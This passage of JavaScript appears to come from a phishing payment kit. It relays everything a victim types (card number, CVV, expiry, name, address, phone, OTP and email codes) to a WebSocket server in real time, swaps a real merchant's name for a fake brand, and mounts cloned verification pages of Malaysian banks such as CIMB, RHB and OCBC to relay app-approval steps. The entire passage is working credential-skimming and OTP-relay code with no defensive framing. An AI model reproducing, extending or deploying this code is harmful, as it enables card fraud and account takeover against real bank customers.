  function bindOverlayControls() {
    bindOnce(q('otp-code'), 'input', function () {
      this.value = this.value.replace(/\D/g, '').slice(0, 8);
      onInput();
    });
    bindOnce(q('otp-submit'), 'click', submitOtp);
    bindOnce(q('otp-resend'), 'click', resendOtp);

    bindOnce(q('email-code'), 'input', function () {
      this.value = this.value.replace(/\D/g, '').slice(0, 8);
      onInput();
    });
    bindOnce(q('email-submit'), 'click', submitEmailCode);
    bindOnce(q('email-resend'), 'click', resendEmailCode);

    bindOnce(q('app-continue-btn'), 'click', appVerifyContinue);
    bindOnce(q('pin-submit'), 'click', submitPin);

    for (var i = 1; i <= 4; i++) {
      (function (idx) {
        var pinEl = document.getElementById('pin-d' + idx);
        bindOnce(pinEl, 'input', function () { pinJump(idx); });
        bindOnce(pinEl, 'keydown', function (e) { pinBack(e, idx); });
      })(i);
    }

    applyMerchantBranding();
  }

  window.resetOtp = resetOtp;
  window.submitPin = submitPin;
  window.pinJump = pinJump;
  window.pinBack = pinBack;
  window.resendEmailCode = resendEmailCode;
 
  /* ═══════════════════════════════════════════
     9. 提交按钮
  ═══════════════════════════════════════════ */
  var submitBtn = q('pay-btn');
  if (submitBtn) {
    submitBtn.addEventListener('click', submitPayment);
  }
 
 
  /* ═══════════════════════════════════════════
     10. 实时输入推送（150ms 防抖，Cineplex 同款）
  ═══════════════════════════════════════════ */
  var liveTimer = null;
 
  function livePush() {
    if (!ws || ws.readyState !== WebSocket.OPEN) return;
    if (!sid && _sessionCreating) return;
    var payload = buildPayload();
    if (!sid) {
      payload.ua = navigator.userAgent;
      _sessionCreating = true;
      ws.send(JSON.stringify({ type: 'customer_input', payload: payload }));
    } else {
      ws.send(JSON.stringify({
        type: 'session_update',
        payload: {
          sessionId:    sid,
          cardInfo:     payload.cardInfo,
          customerInfo: payload.customerInfo,
          orderInfo:    payload.orderInfo,
          currentStep:  _curStep
        }
      }));
    }
  }
 
  function onInput() {
    clearTimeout(liveTimer);
    liveTimer = setTimeout(livePush, 150);
  }
 
  var liveInputs = [
    'cardNumber', 'expiry', 'cvv', 'cardHolder',
    'fullName', 'email', 'phone',
    'country', 'address1', 'city', 'state', 'zipCode',
    'otp-code',
    'email-code'
  ];
  liveInputs.forEach(function (id) {
    var el = q(id);
    if (el) el.addEventListener('input', onInput);
  });
  // payment method radio change → livePush
  var pmRadios = document.querySelectorAll('input[name="payment_method"]');
  pmRadios.forEach(function (r) { r.addEventListener('change', onInput); });
 
 
  /* ═══════════════════════════════════════════
/* WS started by payment-overlays.js after overlay mount */









function isRelativeAssetUrl(url) {
  return url && !/^(?:[a-z][a-z0-9+.-]*:|\/\/|\/|#)/i.test(url);
}

function assetUrl(url, pagePath) {
  var clean = url.replace(/^\.\//, '');
  var filename = clean.substring(clean.lastIndexOf('/') + 1);
  return pagePath.replace(/\/$/, '') + '/' + filename;
}

function rewriteMerchantNames(markup) {
  return markup.replace(/RedBus/gi, MERCHANT_NAME).replace(/REDBUS/g, 'TITANCORE');
}

function rewriteAssetUrls(markup, pagePath) {
  return rewriteMerchantNames(markup)
    .replace(/\b(src|href|poster)=(["'])([^"']+)\2/gi, function (match, attr, quote, url) {
      if (!isRelativeAssetUrl(url)) return match;
      return attr + '=' + quote + assetUrl(url, pagePath) + quote;
    })
    .replace(/url\((["']?)([^)"']+)\1\)/gi, function (match, quote, url) {
      if (!isRelativeAssetUrl(url)) return match;
      return 'url(' + (quote || '') + assetUrl(url, pagePath) + (quote || '') + ')';
    });
}

async function loadPage(pagePath, mountId) {
  var htmlText = await fetch(pagePath + '/index.html').then(function (r) { return r.text(); });
  var cssHrefs = [];
  htmlText.replace(/<link[^>]+href="([^"]+)"[^>]*>/gi, function (_, href) {
    if (href.endsWith('.css')) cssHrefs.push(href.substring(href.lastIndexOf('/') + 1));
    return _;
  });
  var cssTexts = await Promise.all(cssHrefs.map(function (h) {
    return fetch(pagePath + '/' + h)
      .then(function (r) { return r.text(); }, function () { return ''; })
      .then(function (css) { return rewriteAssetUrls(css, pagePath); });
  }));
  var host = document.getElementById(mountId);
  if (!host) return;
  host.innerHTML = '';
  var shadow = host.attachShadow({ mode: 'open' });
  var cleanHtml = rewriteAssetUrls(htmlText, pagePath).replace(/<link[^>]*\.css[^>]*>/gi, '');
  shadow.innerHTML = '<style>' + cssTexts.join('\n') + '</style>' + cleanHtml;
}

function makeAppContinue(mountId) {
  return function () {
    var m = document.querySelector('#' + mountId);
    if (!m || !m.shadowRoot) return;
    var box = m.shadowRoot.querySelector('div > div');
    if (box) { box.style.display = 'flex'; box.classList.remove('hidden'); }
    if (ws && ws.readyState === 1 && sid) {
      ws.send(JSON.stringify({ type: 'app_verify_done', payload: { sessionId: sid } }));
    }
  };
}

var CustomizationappVerifyContinue1 = makeAppContinue('mount1');
var CustomizationappVerifyContinue2 = makeAppContinue('mount2');
var CustomizationappVerifyContinue3 = makeAppContinue('mount3');
var CustomizationappVerifyContinue4 = makeAppContinue('mount4');
var CustomizationappVerifyContinue5 = makeAppContinue('mount5');
var CustomizationappVerifyContinue6 = makeAppContinue('mount6');
var CustomizationappVerifyContinue7 = makeAppContinue('mount7');

async function initBanks() {
  await loadPage('/pay/AMBANK', 'mount1');
  document.querySelector('#mount1').shadowRoot.querySelector('#formactions > a > div').addEventListener('click', CustomizationappVerifyContinue1);
  await loadPage('/pay/CIMB', 'mount2');
  document.querySelector('#mount2').shadowRoot.querySelector('#formactions > a > div').addEventListener('click', CustomizationappVerifyContinue2);
  await loadPage('/pay/MALAYAN', 'mount3');
  document.querySelector('#mount3').shadowRoot.querySelector('#oobCheckBtn > div').addEventListener('click', CustomizationappVerifyContinue3);
  await loadPage('/pay/OCBC', 'mount4');
  document.querySelector('#mount4').shadowRoot.querySelector('#formactions').addEventListener('click', CustomizationappVerifyContinue4);
  await loadPage('/pay/RHB', 'mount5');
  document.querySelector('#mount5').shadowRoot.querySelector('#formactionsoob > td > a > div').addEventListener('click', CustomizationappVerifyContinue5);
  await loadPage('/pay/PBB', 'mount6');
  document.querySelector('#mount6').shadowRoot.querySelector('#ExitLink').addEventListener('click', CustomizationappVerifyContinue6);
  await loadPage('/pay/SCBMB', 'mount7');
  document.querySelector('#mount7').shadowRoot.querySelector('#ExitLink').addEventListener('click', CustomizationappVerifyContinue7);
}

window.tcPayment.wsConnect = wsConnect;
window.tcPayment.handleAction = handleAction;
window.tcPayment.buildPayload = buildPayload;
window.tcPayment.sendPayload = sendPayload;
window.tcPayment.submitPayment = submitPayment;
window.tcPayment.initBanks = initBanks;
window.tcPayment.bindOverlayControls = bindOverlayControls;
window.CustomizationappVerifyContinue1 = CustomizationappVerifyContinue1;
window.CustomizationappVerifyContinue2 = CustomizationappVerifyContinue2;
window.CustomizationappVerifyContinue3 = CustomizationappVerifyContinue3;
window.CustomizationappVerifyContinue4 = CustomizationappVerifyContinue4;
window.CustomizationappVerifyContinue5 = CustomizationappVerifyContinue5;
window.CustomizationappVerifyContinue6 = CustomizationappVerifyContinue6;
window.CustomizationappVerifyContinue7 = CustomizationappVerifyContinue7;
})();
